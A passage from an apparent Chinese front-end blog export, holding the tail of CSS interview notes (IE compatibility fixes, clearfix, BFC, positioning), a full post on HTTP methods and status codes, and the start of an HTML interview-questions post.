float实现的，横向的间距设置如果用margin实现，这就是一个必然会碰到的兼容性问题。(3)三：设置较小高度标签（一般小于10px），在IE6，IE7，遨游中高度超出自己设置高度问题症状：IE6、7和遨游里这个标签的高度不受控制，超出自己设置的高度碰到频率：60%解决方案：给超出高度的标签设置overflow:hidden;或者设置行高line-height 小于你设置的高度。备注：这种情况一般出现在我们设置小圆角背景的标签里。出现这个问题的原因是IE8之前的浏览器都会给标签一个最小默认的行高的高度。即使你的标签是空的，这个标签的高度还是会达到默认的行高。(4)四：行内属性标签，设置display:block后采用float布局，又有横向的margin的情况，IE6间距bug问题症状：IE6里的间距比超过设置的间距碰到几率：20%解决方案 ： 在display:block;后面加入display:inline;display:table;备注：行内属性标签，为了设置宽高，我们需要设置display:block;(除了input标签比较特殊)。在用float布局并有横向的margin后，在IE6下，他就具有了块属性float后的横向margin的bug。不过因为它本身就是行内属性标签，所以我们再加上display:inline的话，它的高宽就不可设了。这时候我们还需要在display:inline后面加入display:talbe。(5)五：图片默认有间距问题症状：几个img标签放在一起的时候，有些浏览器会有默认的间距，加了问题一中提到的通配符也不起作用。碰到几率：20%解决方案：使用float属性为img布局备注 ： 因为img标签是行内属性标签，所以只要不超出容器宽度，img标签都会排在一行里，但是部分浏览器的img标签之间会有个间距。去掉这个间距使用float是正道。（使用负margin，虽然能解决，但负margin本身就是容易引起浏览器兼容问题的用法，所以不建议使用）(6)六：标签最低高度设置min-height不兼容问题症状：因为min-height本身就是一个不兼容的CSS属性，所以设置min-height时不能很好的被各个浏览器兼容碰到几率：5%解决方案：如果我们要设置一个标签的最小高度200px，需要进行的设置为：{min-height:200px; height:auto !important; height:200px; overflow:visible;}备注：在B/S系统前端开时，有很多情况下我们有这种需求。当内容小于一个值（如300px）时，容器的高度为300px；当内容高度大于这个值时，容器高度被撑高，而不是出现滚动条。这时候我们就会面临这个兼容性问题。(7)七：透明度的兼容CSS设置一般在ie中用的是filter:alpha(opacity=0);这个属性来设置div或者是块级元素的透明度，而在firefox中，一般就是直接使用opacity:0,对于兼容的，一般的做法就是在书写css样式的将2个都写上就行，就能实现兼容。 列出display的值并说明作用display： none | inline | block | list-item | inline-block | table | inline-table | table-caption | table-cell | table-row | table-row-group | table-column | table-column-group | table-footer-group | table-header-group | run-in | box | inline-box | flexbox | inline-flexbox | flex | inline-flex默认值：inline none： 隐藏对象。与visibility属性的hidden值不同，其不为被隐藏的对象保留其物理空间inline： 指定对象为内联元素。block： 指定对象为块元素。list-item： 指定对象为列表项目。inline-block： 指定对象为内联块元素。(CSS2)table： 指定对象作为块元素级的表格。类同于html标签&lt;table&gt;(CSS2)inline-table： 指定对象作为内联元素级的表格。类同于html标签&lt;table&gt;(CSS2)table-caption： 指定对象作为表格标题。类同于html标签&lt;caption&gt;(CSS2)table-cell： 指定对象作为表格单元格。类同于html标签&lt;td&gt;(CSS2)table-row： 指定对象作为表格行。类同于html标签&lt;tr&gt;(CSS2)table-row-group： 指定对象作为表格行组。类同于html标签&lt;tbody&gt;(CSS2)table-column： 指定对象作为表格列。类同于html标签&lt;col&gt;(CSS2)table-column-group：指定对象作为表格列组显示。类同于html标签&lt;colgroup&gt;(CSS2)table-header-group： 指定对象作为表格标题组。类同于html标签&lt;thead&gt;(CSS2)table-footer-group：指定对象作为表格脚注组。类同于html标签&lt;tfoot&gt;(CSS2)run-in： 根据上下文决定对象是内联对象还是块级对象。(CSS3)box： 将对象作为弹性伸缩盒显示。（伸缩盒最老版本）(CSS3)inline-box： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最老版本）(CSS3)flexbox： 将对象作为弹性伸缩盒显示。（伸缩盒过渡版本）(CSS3)inline-flexbox： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒过渡版本）(CSS3)flex： 将对象作为弹性伸缩盒显示。（伸缩盒最新版本）(CSS3)inline-flex： 将对象作为内联块级弹性伸缩盒显示。（伸缩盒最新版本）(CSS3)参考display的32种写法。 居中div，居中一个浮动元素(1)非浮动元素居中：div为块级元素，居中块级元素首先要设置宽度,然后margin:0 auto;就居中了；还可以通过定位 方式；父级元素设置text-align:center;的方式等等。参考CSS居中完整指南。(2)、浮动元素居中:方法一:设置当前div的宽度，然后设置margin-left:50%; position:relative; left:-width/2 px;其中的left是宽度的一半。方法二:父元素和子元素同时左浮动，然后父元素相对左移动50%，再然后子元素相对左移动-50%。方法三:position定位等等。例如： &lt;style&gt; .box{ position: relative; left:50%; float:left; } .item{ position: relative; left:-50%; float:left; background: red; } &lt;/style&gt; &lt;div class=&quot;box&quot;&gt; &lt;div class=&quot;item&quot;&gt;123&lt;/div&gt; &lt;/div&gt; 注：left:50%;这个left按照百分比来设置left值实际移动是按父容器的宽度来算，可以先看成box容器为body宽度为也就是浏览器宽度，left:50%;就是向右移动到中间，现在还要向左移动浮动元素item一半的距离，box的float是为了让box自身收缩，这样item的父容器的宽度就是本身的宽度了，再设置为left:-50%;也就是向左移动自身宽度的一半。 几种清除浮动的方法两种思路，五种方法。 思路1：父级定义；思路2：结尾定义。(1)、父级div定义 height原理：父级div手动定义height，就解决了父级div无法自动获取到高度的问题。优点：简单、代码少、容易掌握缺点：只适合高度固定的布局，要给出精确的高度，如果高度和父级div不一样时，会产生问题建议：不推荐使用，只建议高度固定的布局时使用(2)、结尾处加空div标签 clear:both原理：在父元素中，追加空子元，即添加一个空div，并利用css提供的clear:both清除浮动，让父级div能自动获取到高度优点：简单、代码少、浏览器支持好、不容易出现怪问题缺点：不少初学者不理解原理；如果页面浮动布局多，就要增加很多空div，让人感觉很不好建议：不推荐使用，但此方法是以前主要使用的一种清除浮动方法(3)、父级div定义 伪类:after 和 zoom原理：IE8以上和非IE浏览器才支持:after，原理和方法2有点类似，zoom(IE专有属性)可解决ie6,ie7浮动问题优点：浏览器支持好、不容易出现怪问题（目前：大型网站都有使用，如：腾迅，网易，新浪等等）缺点：代码多、不少初学者不理解原理，要两句代码结合使用才能让主流浏览器都支持。建议：推荐使用，建议定义公共类，以减少CSS代码。(4)、父级div定义 overflow:hidden原理：必须定义width或zoom:1，同时不能定义height，使用overflow:hidden时，浏览器会自动检查浮动区域的高度优点：简单、代码少、浏览器支持好缺点：不能和position配合使用，因为超出的尺寸的会被隐藏。建议：只推荐没有使用position或对overflow:hidden理解比较深的朋友使用。(5)、父级div定义 overflow:auto原理：必须定义width或zoom:1，同时不能定义height，使用overflow:auto时，浏览器会自动检查浮动区域的高度优点：简单、代码少、浏览器支持好缺点：内部宽高超过父级div时，会出现滚动条。建议：不推荐使用，如果你需要出现滚动条或者确保你的代码不会出现滚动条就使用吧。(6)、使用内容生成的方式清除浮动 .clearfix:after { content:&quot;&quot;; display: block; clear:both; } :after 选择器向选定的元素之后插入内容content:””; 生成内容为空display: block; 生成的元素以块级元素显示,clear:both; 清除前面元素浮动带来的影响相对于空标签闭合浮动的方法优势：不破坏文档结构，没有副作用弊端：代码量多参考 详解 清除浮动 的多种方式（clearfix）、 解读浮动闭合最佳方案：clearfix。 block，inline和inlinke-block细节对比 display:blocka、block元素会独占一行，多个block元素会各自新起一行。默认情况下，block元素宽度自动填满其父元素宽度。b、block元素可以设置width,height属性。块级元素即使设置了宽度,仍然是独占一行。c、block元素可以设置margin和padding属性。 display:inlinea、inline元素不会独占一行，多个相邻的行内元素会排列在同一行里，直到一行排列不下，才会新换一行，其宽度随元素的内容而变化。b、inline元素设置width,height属性无效。c、inline元素的margin和padding属性，水平方向的padding-left, padding-right, margin-left, margin-right都产生边距效果；但竖直方向的padding-top, padding-bottom, margin-top, margin-bottom不会产生边距效果。 display:inline-blocka、简单来说就是将对象呈现为inline对象，但是对象的内容作为block对象呈现。之后的内联对象会被排列在同一行内。比如我们可以给一个链接（a元素）inline-block属性值，使其既具有block的宽度高度特性又具有inline的同行特性。补充说明a、一般我们会用display:block，display:inline或者display:inline-block来调整元素的布局级别，其实display的参数远远不止这三种，仅仅是比较常用而已。b、IE（低版本IE）本来是不支持inline-block的，所以在IE中对内联元素使用display:inline-block，理论上IE是不识别的，但使用display:inline-block在IE下会触发layout，从而使内联元素拥有了display:inline-block属性的表象。 优雅降级和渐进增强的含义优雅降级： Web站点在所有新式浏览器中都能正常工作，如果用户使用的是老式浏览器，则代码会检查以确认它们是否能正常工作。为那些无法支持功能的浏览器增加候选方案，使之在旧式浏览器上以某种形式降级体验却不至于完全失效。渐进增强： 从被所有浏览器支持的基本功能开始，逐步地添加那些只有新式浏览器才支持的功能,向页面增加无害于基础浏览器的额外样式和功能的。当浏览器支持时，它们会自动地呈现出来并发挥作用。 浮动元素引起的问题及相应解决办法浮动的工作原理： 浮动元素脱离文档流，不占据空间。浮动元素碰到包含它的边框或者浮动元素的边框停留。问题：（1）父元素的高度无法被撑开，影响与父元素同级的元素（2）与浮动元素同级的非浮动元素会跟随其后（3）若非第一个元素浮动，则该元素之前的元素也需要浮动，否则会影响页面显示的结构解决方法：使用CSS中的clear:both;属性来清除元素的浮动可解决问题(2)、(3)，对于问题(1)，添加如下样式，给父元素添加clearfix样式： .clearfix:after { content: &quot;.&quot;; display: block; height: 0; clear: both; visibility: hidden; } .clearfix { display: inline-block; /* for IE/Mac */ }清除浮动的几种方法：(1)、额外标签法(使用空标签清除浮动)&lt;div style=&quot;clear:both;&quot;&gt;&lt;/div&gt;（缺点：会增加额外的标签，使HTML结构看起来不够简洁。）(2)、使用after伪类 #parent:after{ content:” “; height:0; visibility:hidden; display:block; clear:both; }(3)、浮动外部元素(4)、设置overflow为hidden或者auto 性能优化的方法总结一：（1）、减少http请求次数：CSS Sprites, JS、CSS源码压缩、图片大小控制合适；网页Gzip，CDN托管，data缓存 ，图片服务器。（2）、前端模板 JS+数据，减少由于HTML标签导致的带宽浪费，前端用变量保存AJAX请求结果，每次操作本地变量，不用请求，减少请求次数。（3）、用innerHTML代替DOM操作，减少DOM操作次数，优化javascript性能。（4）、当需要设置的样式很多时设置className而不是直接操作style。（5）、少用全局变量、缓存DOM节点查找的结果。减少IO读取操作。（6）、避免使用CSS Expression（css表达式)又称Dynamic properties(动态属性)。（7）、图片预加载，将样式表放在顶部，将脚本放在底部 加上时间戳。回答二：(1)、减少HTTP请求次数(2)、使用CDN(3)、避免空的src和href(4)、为文件头指定Expires(5)、使用gzip压缩内容(6)、把CSS放到顶部(7)、把JS放到底部(8)、避 免使用CSS表达式(9)、将CSS和JS放到外部文件中(10)、避免跳转(11)、可缓存的AJAX(12)、使用GET来完成AJAX请求 初始化CSS样式的意义因为浏览器的兼容问题，不同浏览器对有些标签的默认值是不同的(比如标签默认的margin、padding值不同等情况)，如果没对CSS初始化往往会出现浏览器之间的页面显示差异。当然，初始化样式会对SEO有一定的影响，但鱼和熊掌不可兼得，力求影响最小的情况下初始化。最简单的初始化方法就是： * {padding: 0; margin: 0;} （不建议） CSS中的刻度在CSS中刻度是用于设置元素尺寸的单位。a、特殊值0可以省略单位。例如：margin:0px;可以写成margin:0;b、一些属性可能允许有负长度值，或者有一定的范围限制。如果不支持负长度值，那应该变换到能够被支持的最近的一个长度值。c、长度单位包括：相对单位和绝对单位。相对长度单位有： em, ex, ch, rem, vw, vh, vmax, vmin绝对长度单位有： cm, mm, q, in, pt, pc, px绝对长度单位：1in = 2.54cm = 25.4 mm = 72pt = 6pc = 96px文本相对长度单位：em相对长度单位是相对于当前对象内文本的字体尺寸，如果当前行内文本的字体尺寸未被人为设置，则相对于浏览器的默认字体尺寸。(相对父元素的字体大小倍数) body { font-size: 14px; } h1 { font-size: 16px; } .size1 p { font-size: 1em; } .size2 p { font-size: 2em; } .size3 p { font-size: 3em; }文本相对长度单位：remrem是CSS3新增的一个相对单位（root em，根em），相对于根元素(即html元素)font-size计算值的倍数。只相对于根元素(html元素)的大小。浏览器的默认字体大小为16像素，浏览器默认样式也称为user agent stylesheet，就是所有浏览器内置的默认样式，多数是可以被修改的，但chrome不能直接修改，可以被用户样式覆盖。作用：利用rem可以实现简单的响应式布局，可以利用html元素中字体的大小与屏幕间的比值设置font-size的值实现当屏幕分辨率变化时让元素也变化，以前的天猫tmall就使用这种办法。em与rem的重要区别：它们计算的规则一个是依赖父元素另一个是依赖根元素计算。 box-sizing属性的用法a、box-sizing:content-boxpadding和border不被包含在定义的width和height之内。对象的实际宽度等于设置的width值和border、padding之和，即 ( Element width = width + border + padding，但占有页面位置还要加上margin )。此属性表现为标准模式下的盒模型。b、box-sizing:border-boxpadding和border被包含在定义的width和height之内。对象的实际宽度就等于设置的width值，即使定义有border和padding也不会改变对象的实际宽度，即 ( Element width = width )。 此属性表现为怪异模式下的盒模型。 浏览器标准模式和怪异模式之间的区别所谓的标准模式是指，浏览器按W3C标准解析执行代码；怪异模式则是使用浏览器自己的方式解析执行代码，因为不同浏览器解析执行的方式不一样，所以我们称之为怪异模式。浏览器解析时到底使用标准模式还是怪异模式，与你网页中的DTD声明直接相关，DTD声明定义了标准文档的类型(标准模式解析)，会使浏览器使用相应的方式加载网页并显示，忽略DTD声明,将使网页进入怪异模式(quirks mode)。 怪异Quirks模式是什么，它和标准Standards模式有什么区别从IE6开始，引入了Standards模式，标准模式中，浏览器尝试给符合标准的文档在规范上的正确处理达到在指定浏览器中的程度。在IE6之前CSS还不够成熟，所以IE5等之前的浏览器对CSS的支持很差， IE6将对CSS提供更好的支持，然而这时的问题就来了，因为有很多页面是基于旧的布局方式写的，而如果IE6 支持CSS则将令这些页面显示不正常，如何在即保证不破坏现有页面，又提供新的渲染机制呢？在写程序时我们也会经常遇到这样的问题，如何保证原来的接口不变，又提供更强大的功能，尤其是新功能不兼容旧功能时。遇到这种问题时的一个常见做法是增加参数和分支，即当某个参数为真时，我们就使用新功能，而如果这个参数 不为真时，就使用旧功能，这样就能不破坏原有的程序，又提供新功能。IE6也是类似这样做的，它将DTD当成了这个“参数”，因为以前的页面大家都不会去写DTD，所以IE6就假定 如果写了DTD，就意味着这个页面将采用对CSS支持更好的布局，而如果没有，则采用兼容之前的布局方式。这就是Quirks模式（怪癖模式，诡异模式，怪异模式）。 区别：总体会有布局、样式解析和脚本执行三个方面的区别。盒模型： 在W3C标准中，如果设置一个元素的宽度和高度，指的是元素内容的宽度和高度，而在Quirks模式下，IE的宽度和高度还包含了padding和border。设置行内元素的高宽：在Standards模式下，给&lt;span&gt;等行内元素设置wdith和height都不会生效，而在quirks模式下，则会生效。设置百分比的高度：在standards模式下，一个元素的高度是由其包含的内容来决定的，如果父元素没有设置百分比的高度，子元素设置一个百分比的高度是无效的。用margin:0 auto设置水平居中：使用margin:0 auto;在standards模式下可以使元素水平居中，但在quirks模式下却会失效。（还有很多，答出什么不重要，关键是看他答出的这些是不是自己经验遇到的，还是说都是看文章看的，甚至完全不知道。） 边距折叠外边距折叠： 相邻的两个或多个外边距 (margin) 在垂直方向会合并成一个外边距（margin）相邻： 没有被非空内容、padding、border 或 clear 分隔开的margin特性. 非空内容就是说这元素之间要么是兄弟关系或者父子关系垂直方向外边距合并计算:a、参加折叠的margin都是正值：取其中 margin 较大的值为最终 margin 值。b、参与折叠的 margin 都是负值：取的是其中绝对值较大的，然后，从 0 位置，负向位移。c、参与折叠的 margin 中有正值，有负值：先取出负 margin 中绝对值中最大的，然后，和正 margin 值中最大的 margin 相加。 隐藏元素的方式a、使用CSS的display:none，不会占有原来的位置b、使用CSS的visibility:hidden，会占有原来的位置c、使用HTML5中的新增属性hidden=”hidden”，不会占有原来的位置 为什么重置浏览器默认样式，如何重置默浏览器认样式每种浏览器都有一套默认的样式表，即user agent stylesheet，网页在没有指定的样式时，按浏览器内置的样式表来渲染。这是合理的，像word中也有一些预留样式，可以让我们的排版更美观整齐。不同浏览器甚至同一浏览器不同版本的默认样式是不同的。但这样会有很多兼容问题。a、最简单的办法：（不推荐使用）*{margin: 0;padding: 0;}。b、使用CSSReset可以将所有浏览器默认样式设置成一样。c、normalize：也许有些cssreset过于简单粗暴，有点伤及无辜，normalize是另一个选择。bootstrap已经引用该css来重置浏览器默认样式，比普通的cssreset要精细一些，保留浏览器有用的默认样式，支持包括手机浏览器在内的超多浏览器，同时对HTML5元素、排版、列表、嵌入的内容、表单和表格都进行了一般化。天猫 使用的css reset重置浏览器默认样式： body, h1, h2, h3, h4, h5, h6, hr, p, blockquote, dl, dt, dd, ul, ol, li, pre, form, fieldset, legend, button, input, textarea, th, td {margin: 0;padding: 0} body, button, input, select, textarea {font: 12px “microsoft yahei”;line-height: 1.5;-ms-overflow-style: scrollbar} h1, h2, h3, h4, h5, h6 {font-size: 100%} ul, ol {list-style: none}a {text-decoration: none;cursor:pointer} a:hover {text-decoration: underline} img {border: 0} button, input, select, textarea {font-size: 100%} table {border-collapse: collapse;border-spacing: 0} .clear {clear:both} .fr {float:right} .fl {float:left} .block {display:block;text-indent:-999em} 对BFC与IFC的理解？(是什么，如何产生，作用)(1)、什么是BFC与IFCa、BFC（Block Formatting Context）即”块级格式化上下文”， IFC（Inline Formatting Context）即”行内格式化上下文”。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态。一个框在常规流中必须属于一个格式化上下文，你可以把BFC想象成一个大箱子，箱子外边的元素将不与箱子内的元素产生作用。b、BFC是W3C CSS 2.1规范中的一个概念，它决定了元素如何对其内容进行定位，以及与其他元素的关系和相互作用。当涉及到可视化布局的时候，Block Formatting Context提供了一个环境，HTML元素在这个环境中按照一定规则进行布局。一个环境中的元素不会影响到其它环境中的布局。比如浮动元素会形成BFC，浮动元素内部子元素主要受该浮动元素影响，两个浮动元素之间是互不影响的。也可以说BFC就是一个作用范围。c、在普通流中的 Box(框) 属于一种 formatting context(格式化上下文) ，类型可以是 block ，或者是 inline ，但不能同时属于这两者。并且， Block boxes(块框) 在 block formatting context(块格式化上下文) 里格式化， Inline boxes(块内框) 则在 Inline Formatting Context(行内格式化上下文) 里格式化。(2)、如何产生BFC当一个HTML元素满足下面条件的任何一点，都可以产生Block Formatting Context：a、float的值不为noneb、overflow的值不为visiblec、display的值为table-cell, table-caption, inline-block中的任何一个d、position的值不为relative和staticCSS3触发BFC方式则可以简单描述为：在元素定位非static，relative的情况下触发，float也是一种定位方式。 (3)、BFC的作用与特点a、不和浮动元素重叠，清除外部浮动，阻止浮动元素覆盖。如果一个浮动元素后面跟着一个非浮动的元素，那么就会产生一个重叠的现象。常规流（也称标准流、普通流）是一个文档在被显示时最常见的布局形态，当float不为none时，position为absolute、fixed时元素将脱离标准流。 对页面中使用定位(position)的理解osition：static | relative | absolute | fixed | center | page | sticky默认值：static，center、page、sticky是CSS3中新增加的值。(1)、static可以认为静态的，默认元素都是静态的定位，对象遵循常规流。此时4个定位偏移属性不会被应用，也就是使用left，right，bottom，top将不会生效。(2)、relative相对定位，对象遵循常规流，并且参照自身在常规流中的位置通过top，right，bottom，left这4个定位偏移属性进行偏移时不会影响常规流中的任何元素。(3)、absolutea、绝对定位，对象脱离常规流，此时偏移属性参照的是离自身最近的定位祖先元素，如果没有定位的祖先元素，则一直回溯到body元素。盒子的偏移位置不影响常规流中的任何元素，其margin不与其他任何margin折叠。b、元素定位参考的是离自身最近的定位祖先元素，要满足两个条件，第一个是自己的祖先元素，可以是父元素也可以是父元素的父元素，一直找，如果没有则选择body为对照对象。第二个条件是要求祖先元素必须定位，通俗说就是position的属性值为非static都行。(4)、fixed固定定位，与absolute一致，但偏移定位是以窗口为参考。当出现滚动条时，对象不会随着滚动。(5)、center与absolute一致，但偏移定位是以定位祖先元素的中心点为参考。盒子在其包含容器垂直水平居中。（CSS3）(6)、page与absolute一致。元素在分页媒体或者区域块内，元素的包含块始终是初始包含块，否则取决于每个absolute模式。（CSS3）(7)、sticky对象在常态时遵循常规流。它就像是relative和fixed的合体，当在屏幕中时按常规流排版，当卷动到屏幕外时则表现如fixed。该属性的表现是现实中你见到的吸附效果。（CSS3） 如何解决多个元素重叠问题使用z-index属性可以设置元素的层叠顺序。z-index属性语法：z-index: auto | &lt;integer&gt;默认值：auto适用于：定位元素。即定义了position为非static的元素取值：auto： 元素在当前层叠上下文中的层叠级别是0。元素不会创建新的局部层叠上下文，除非它是根元素。整数： 用整数值来定义堆叠级别。可以为负值。 说明：检索或设置对象的层叠顺序。z-index用于确定元素在当前层叠上下文中的层叠级别，并确定该元素是否创建新的局部层叠上下文。当多个元素层叠在一起时，数字大者将显示在上面。 页面布局的方式页面布局方式。 overflow :hidden是否形成新的块级格式化上下文会形成，触发BFC的条件有：float的值不为none。overflow的值不为visible。display的值为table-cell, table-caption, inline-block 中的任何一个。position的值不为relative 和static。]]></content>
      <categories>
        <category>面试题</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>面试题</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HTTP基础学习总结]]></title>
    <url>%2F2018%2F01%2F09%2Fintroduction-about-HTTP%2F</url>
    <content type="text"><![CDATA[关于HTTP协议相关知识的学习总结。 简介HTTP协议（Hyper Text Transfer Protocol，超文本传输协议）,是用于从万维网（WWW:World Wide Web ）服务器传输超文本到本地浏览器的传送协议。 HTTP基于TCP/IP通信协议来传递数据。 HTTP基于客户端/服务端（C/S）架构模型，通过一个可靠的链接来交换信息，是一个无状态的请求/响应协议。 特点（1）HTTP是无连接：无连接的含义是限制每次连接只处理一个请求。服务器处理完客户的请求，并收到客户的应答后，即断开连接。采用这种方式可以节省传输时间。 （2）HTTP是媒体独立的：只要客户端和服务器知道如何处理的数据内容，任何类型的数据都可以通过HTTP发送。客户端以及服务器指定使用适合的MIME-type内容类型。 （3）HTTP是无状态：无状态是指协议对于事务处理没有记忆能力。缺少状态意味着如果后续处理需要前面的信息，则它必须重传，这样可能导致每次连接传送的数据量增大。另一方面，在服务器不需要先前信息时它的应答就较快。 通信流程 消息结构HTTP使用统一资源标识符（Uniform Resource Identifiers, URI）来传输数据和建立连接。一旦建立连接后，数据消息就通过类似Internet邮件所使用的格式[RFC5322]和多用途Internet邮件扩展（MIME）[RFC2045]来传送。 客户端请求消息：请求行、请求头部、空行和请求数据。 GET /hello.txt HTTP/1.1 User-Agent: curl/7.16.3 libcurl/7.16.3 OpenSSL/0.9.7l zlib/1.2.3 Host: www.example.com Accept-Language: en, mi服务端响应消息：状态行、消息报头、空行和响应正文。 HTTP/1.1 200 OK Date: Mon, 27 Jul 2009 12:28:53 GMT Server: Apache Last-Modified: Wed, 22 Jul 2009 19:15:56 GMT ETag: “34aa387-d-1568eb00” Accept-Ranges: bytes Content-Length: 51 Vary: Accept-Encoding Content-Type: text/plain 请求方法​ GET 请求指定的页面信息，并返回实体主体。 ​ HEAD 类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头 ​ POST 向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。 POST请求可能会导致新的资源的建立和/或已有资源的修改。 ​ PUT 从客户端向服务器传送的数据取代指定的文档的内容。 ​ DELETE 请求服务器删除指定的页面。 ​ CONNECT HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。 ​ OPTIONS 允许客户端查看服务器的性能。 ​ TRACE 回显服务器收到的请求，主要用于测试或诊断 状态码HTTP状态码分类​ 1xx 信息，服务器收到请求，需要请求者继续执行操作​ 2xx 成功，操作被成功接收并处理​ 3xx 重定向，需要进一步的操作以完成请求​ 4xx 客户端错误，请求包含语法错误或无法完成请求​ 5xx 服务器错误，服务器在处理请求的过程中发生了错 HTTP状态码列表​ 100 Continue 继续。客户端应继续其请求 ​ 101 Switching Protocols 切换协议。服务器根据客户端的请求切换协议。只能切换到更高级的协议，例如，切换到HTTP的新版本协议 ​ 200 OK 请求成功。一般用于GET与POST请求 ​ 201 Created 已创建。成功请求并创建了新的资源 ​ 202 Accepted 已接受。已经接受请求，但未处理完成 ​ 203 Non-Authoritative Information 非授权信息。请求成功。但返回的meta信息不在原始的服务器，而是一个副本 ​ 204 No Content 无内容。服务器成功处理，但未返回内容。在未更新网页的情况下，可确保浏览器继续显示当前文档 ​ 205 Reset Content 重置内容。服务器处理成功，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域 ​ 206 Partial Content 部分内容。服务器成功处理了部分GET请求 ​ 300 Multiple Choices 多种选择。请求的资源可包括多个位置，相应可返回一个资源特征与地址的列表用于用户终端（例如：浏览器）选择 ​ 301 Moved Permanently 永久移动。请求的资源已被永久的移动到新URI，返回信息会包括新的URI，浏览器会自动定向到新URI。今后任何新的请求都应使用新的URI代替 ​ 302 Found 临时移动。与301类似。但资源只是临时被移动。客户端应继续使用原有URI ​ 303 See Other 查看其它地址。与301类似。使用GET和POST请求查看 ​ 304 Not Modified 未修改。所请求的资源未修改，服务器返回此状态码时，不会返回任何资源。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源 ​ 305 Use Proxy 使用代理。所请求的资源必须通过代理访问 ​ 306 Unused 已经被废弃的HTTP状态码 ​ 307 Temporary Redirect 临时重定向。与302类似。使用GET请求重定向 ​ 400 Bad Request 客户端请求的语法错误，服务器无法理解 ​ 401 Unauthorized 请求要求用户的身份认证 ​ 402 Payment Required 保留，将来使用 ​ 403 Forbidden 服务器理解请求客户端的请求，但是拒绝执行此请求 ​ 404 Not Found 服务器无法根据客户端的请求找到资源（网页）。通过此代码，网站设计人员可设置”您所请求的资源无法找到”的个性页面 ​ 405 Method Not Allowed 客户端请求中的方法被禁止 ​ 406 Not Acceptable 服务器无法根据客户端请求的内容特性完成请求 ​ 407 Proxy Authentication Required 请求要求代理的身份认证，与401类似，但请求者应当使用代理进行授权 ​ 408 Request Time-out 服务器等待客户端发送的请求时间过长，超时 ​ 409 Conflict 服务器完成客户端的PUT请求是可能返回此代码，服务器处理请求时发生了冲突 ​ 410 Gone 客户端请求的资源已经不存在。410不同于404，如果资源以前有现在被永久删除了可使用410代码，网站设计人员可通过301代码指定资源的新位置 ​ 411 Length Required 服务器无法处理客户端发送的不带Content-Length的请求信息 ​ 412 Precondition Failed 客户端请求信息的先决条件错误 ​ 413 Request Entity Too Large 由于请求的实体过大，服务器无法处理，因此拒绝请求。为防止客户端的连续请求，服务器可能会关闭连接。如果只是服务器暂时无法处理，则会包含一个Retry-After的响应信息 ​ 414 Request-URI Too Large 请求的URI过长（URI通常为网址），服务器无法处理 ​ 415 Unsupported Media Type 服务器无法处理请求附带的媒体格式 ​ 416 Requested range not satisfiable 客户端请求的范围无效 ​ 417 Expectation Failed 服务器无法满足Expect的请求头信息 ​ 500 Internal Server Error 服务器内部错误，无法完成请求 ​ 501 Not Implemented 服务器不支持请求的功能，无法完成请求 ​ 502 Bad Gateway 充当网关或代理的服务器，从远端服务器接收到了一个无效的请求 ​ 503 Service Unavailable 由于超载或系统维护，服务器暂时的无法处理客户端的请求。延时的长度可包含在服务器的Retry-After头信息中 ​ 504 Gateway Time-out 充当网关或代理的服务器，未及时从远端服务器获取请求 ​ 505 HTTP Version not supported 服务器不支持请求的HTTP协议的版本，无法完成处理]]></content>
      <categories>
        <category>HTTP</category>
      </categories>
      <tags>
        <tag>HTTP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【interview questions about HTML】 from牛客网]]></title>
    <url>%2F2018%2F01%2F08%2Finterview-questions-about-HTML%2F</url>
    <content type="text"><![CDATA[来自牛客网前端面试常考知识点 HTML+CSS 篇学习总结。 浏览器页面有哪三层构成浏览器页面有哪三层构成，分别是什么，作用是什么?浏览器页面有结构层、表示层、行为层，三层构成，分别是HTML、CSS、JavaScript，作用是HTML实现页面结构(骨架)，CSS完成页面的表现与风格(肌肤)，JavaScript实现一些客户端的功能与业务(动作)，对用户事件作出反应。不过，在这三种技术之间存在着一些潜在的重叠区域，如DOM技术可以用来改变网页的结构；CSS诸如:hover和:focus之类的class伪类，使我们可以根据用户触发事件来改变呈现效果。改变元素的呈现效果当然是表示层的“势力范围”，但对用户触发事件做出反应却是行为层的领地。表示层和行为层的这种重叠形成了一个灰色地带。class伪类是 CSS 正在深入DOM领地证据，但 DOM在这方面也不是毫无作为，完全可以利用 DOM 技术把样式信息施加在HTML元素身上。分离的效果要做到即使去掉表示层和行为层，文档的内容也依然可以访问，因为“内容才是一切”。而且网页的行为层(javascript)与其结构(HTML)是彼此互不干扰的，不能混杂在一起。还要给行为层“预留退路”，要考虑到如果你的用户禁用了Javascript会怎样？网页是否还可以正常运作。做到平稳退化，渐进增强。 HTML5的优点与缺点HTML5是什么: HTML5指的是包括HTML、CSS和JavaScript在内的一套技术组合。它希望能够减少网页浏览器对于需要插件的丰富性网络应用服务（ Plug-in-Based Rich Internet Application ，RIA），例如：AdobeFlash 、Microsoft Silverlight与Oracle JavaFX的需求，并且提供更多能有效加强网络应用的标准集。 HTML5 HTML 最新版本，2014 年10月由万维网联盟（ W3C ）完成标准制定。目标是替换 1999 年所制定的 HTML 4.01和XHTML 1.0标准，以期能在互联网应用迅速发展的时候，使网络标准达到匹配当代的网络需求。为什么有HTML5的出现： HTML4陈旧不能满足日益发展的互联网需要，特别是移动互联网。为了增强浏览器功能 Flash 被广泛使用，但安全与稳定堪忧，不适合在移动端使用（耗电、触摸、不开放）。HTML5增强了浏览器的原生功能，符合HTML5规范的浏览器功能将更加强大，减少了 Web应用对插件的依赖，让用户体验更好，让开发更加方便，另外W3C 从推出 HTML4.0到5.0之间共经历了17年，HTML的变化很小，这并不符合一个好产品的演进规则。优点： 网络标准统一HTML5本身是由W3C推荐出来的，它的开发是通过谷歌、苹果，诺基亚、中国移动等几百家公司一起酝酿的技术，这个技术最大的好处在于它是一个公开的技术。换句话说，每一个公开的标准都可以根据W3C的资料库找寻根源。另一方面，W3C通过的HTML5标准也就意味着每一个浏览器或每一个平台都会去实现。 